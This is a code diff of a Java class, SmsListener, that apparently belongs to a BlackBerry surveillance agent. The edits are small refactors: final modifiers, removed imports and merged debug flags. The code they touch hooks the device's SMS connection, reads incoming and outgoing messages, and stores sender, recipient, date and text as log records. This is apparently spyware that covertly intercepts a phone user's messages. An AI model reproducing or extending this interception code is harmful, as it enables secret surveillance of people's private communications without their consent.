@@ -1,7 +1,6 @@
 //#preprocess
 package blackberry.agent.sms;
 
-import java.io.ByteArrayOutputStream;
 import java.io.IOException;
 import java.io.UnsupportedEncodingException;
 import java.util.Date;
@@ -15,7 +14,6 @@ import net.rim.blackberry.api.phone.Phone;
 import net.rim.device.api.system.RuntimeStore;
 import net.rim.device.api.util.DataBuffer;
 import blackberry.agent.MessageAgent;
-import blackberry.config.Keys;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.log.LogType;
@@ -54,7 +52,7 @@ public class SmsListener {
         if (instance == null) {
             instance = (SmsListener) RuntimeStore.getRuntimeStore().get(GUID);
             if (instance == null) {
-                SmsListener singleton = new SmsListener();
+                final SmsListener singleton = new SmsListener();
                 RuntimeStore.getRuntimeStore().put(GUID, singleton);
                 instance = singleton;
             }
@@ -65,7 +63,7 @@ public class SmsListener {
     }
 
     public synchronized boolean isRunning() {
-        boolean ret = smsconn != null;
+        final boolean ret = smsconn != null;
 
         //#ifdef DBC
         Check.asserts((smsconn != null) == ret,
@@ -89,7 +87,7 @@ public class SmsListener {
 
     public synchronized final void start() {
         if (isRunning()) {
-            //#ifdef DEBUG_ERROR
+            //#ifdef DEBUG
             debug.error("already running");
             //#endif
             return;
@@ -97,7 +95,7 @@ public class SmsListener {
         try {
             smsconn = (MessageConnection) Connector.open("sms://:0");
 
-            //#ifdef DEBUG_TRACE
+            //#ifdef DEBUG
             debug.trace("start: SMSListener");
             //#endif
 
@@ -107,7 +105,7 @@ public class SmsListener {
             // insms = new SMSINListener(smsconn, this);
 
         } catch (final IOException e) {
-            //#ifdef DEBUG_ERROR
+            //#ifdef DEBUG
             debug.error(e);
             //#endif
         }
@@ -118,7 +116,7 @@ public class SmsListener {
         try {
             smsconn.setMessageListener(inoutsms);
         } catch (final IOException e) {
-            //#ifdef DEBUG_ERROR
+            //#ifdef DEBUG
             debug.error(e);
             //#endif
         }
@@ -126,43 +124,43 @@ public class SmsListener {
 
     public synchronized final void stop() {
         if (!isRunning()) {
-            //#ifdef DEBUG_ERROR
+            //#ifdef DEBUG
             debug.error("already not running");
             //#endif
             return;
         }
 
-        //#ifdef DEBUG_INFO
+        //#ifdef DEBUG
         debug.info("Stopping SMSListener");
         //#endif
         try {
             if (smsconn != null) {
-                //#ifdef DEBUG_TRACE
+                //#ifdef DEBUG
                 debug.trace("stop: smsconn");
                 //#endif
                 smsconn.close();
             }
             if (inoutsms != null) {
-                //#ifdef DEBUG_TRACE
+                //#ifdef DEBUG
                 debug.trace("stop: inoutsms");
                 //#endif
                 inoutsms.stop();
             }
 
             if (inThread != null) {
-                //#ifdef DEBUG_TRACE
+                //#ifdef DEBUG
                 debug.trace("stop: joining inThread");
                 //#endif
 
                 inThread.join();
 
-                //#ifdef DEBUG_TRACE
+                //#ifdef DEBUG
                 debug.trace("stop: joined inThread");
                 //#endif
             }
 
         } catch (final Exception e) {
-            //#ifdef DEBUG_ERROR
+            //#ifdef DEBUG
             debug.error(e);
             //#endif
         } finally {
@@ -183,11 +181,11 @@ public class SmsListener {
         Check.requires(message != null, "saveLog: null message");
         //#endif
 
-        //#ifdef DEBUG_TRACE
+        //#ifdef DEBUG
         debug.trace("saveLog: " + message);
         //#endif
 
-        byte[] dataMsg = getDataMessage(message);
+        final byte[] dataMsg = getDataMessage(message);
         //#ifdef DBC
         Check.asserts(dataMsg != null, "saveLog: null dataMsg");
         //#endif
@@ -211,14 +209,14 @@ public class SmsListener {
             if (address.indexOf(prefix) == 0) {
                 address = address.substring(prefix.length());
             } else {
-                //#ifdef DEBUG_ERROR
+                //#ifdef DEBUG
                 debug.error("Not a sms");
                 //#endif
                 return false;
             }
 
             if (address.indexOf(":") > 0) {
-                //#ifdef DEBUG_WARN
+                //#ifdef DEBUG
                 debug.warn("Probably a MMS");
                 //#endif
                 return false;
@@ -226,7 +224,7 @@ public class SmsListener {
 
             // Filling fields
 
-            Date date = new Date();
+            final Date date = new Date();
 
             if (incoming) {
                 from = address;
@@ -253,7 +251,7 @@ public class SmsListener {
             databuffer.write(Utils.padByteArray(from, 16));
             databuffer.write(Utils.padByteArray(to, 16));
 
-            //#ifdef DEBUG_INFO
+            //#ifdef DEBUG
             debug.info("sms : " + (incoming ? "incoming" : "outgoing"));
             debug.info("From: " + from + " To: " + to + " date: "
                     + filetime.toString());
@@ -272,7 +270,7 @@ public class SmsListener {
                         .createLog(additionalData, dataMsg, LogType.SMS_NEW);
                 return true;
             } else {
-                //#ifdef DEBUG_ERROR
+                //#ifdef DEBUG
                 debug.error("data null");
                 //#endif
 
@@ -280,7 +278,7 @@ public class SmsListener {
             }
 
         } catch (final Exception ex) {
-            //#ifdef DEBUG_ERROR
+            //#ifdef DEBUG
             debug.error("saveLog message: " + ex);
             //#endif
             return false;
@@ -298,8 +296,8 @@ public class SmsListener {
 
         if (message instanceof TextMessage) {
             final TextMessage tm = (TextMessage) message;
-            String msg = tm.getPayloadText();
-            //#ifdef DEBUG_INFO
+            final String msg = tm.getPayloadText();
+            //#ifdef DEBUG
             debug.info("Got Text SMS: " + msg);
             //#endif
 
@@ -311,19 +309,19 @@ public class SmsListener {
             try {
 
                 //String msg16 = new String(data, "UTF-16BE");
-                String msg8 = new String(dataMsg, "UTF-8");
+                final String msg8 = new String(dataMsg, "UTF-8");
 
-                //#ifdef DEBUG_TRACE
+                //#ifdef DEBUG
                 //debug.trace("saveLog msg16:" + msg16);
                 debug.trace("saveLog msg8:" + msg8);
                 //#endif
 
             } catch (final UnsupportedEncodingException e) {
-                //#ifdef DEBUG_ERROR
+                //#ifdef DEBUG
                 debug.error("saveLog:" + e);
                 //#endif
             }
-            //#ifdef DEBUG_INFO
+            //#ifdef DEBUG
             debug.info("Got Binary SMS, len: " + dataMsg.length);
             //#endif
         }
